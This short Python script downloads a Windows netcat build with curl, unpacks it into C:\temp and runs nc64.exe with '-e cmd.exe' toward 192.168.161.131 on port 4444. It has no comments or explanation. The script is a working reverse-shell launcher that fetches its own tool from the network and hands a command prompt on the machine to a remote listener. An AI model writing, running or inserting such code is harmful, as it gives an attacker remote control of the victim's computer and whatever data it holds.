import os
import shutil

os.system(
    r'curl https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -o C:\temp\netcat.zip'
)

shutil.unpack_archive(
    r'C:\temp\netcat.zip',
    r'C:\temp'
)

os.chdir(r'C:\temp\netcat-1.11')

os.system(r'nc64.exe 192.168.161.131 4444 -e cmd.exe')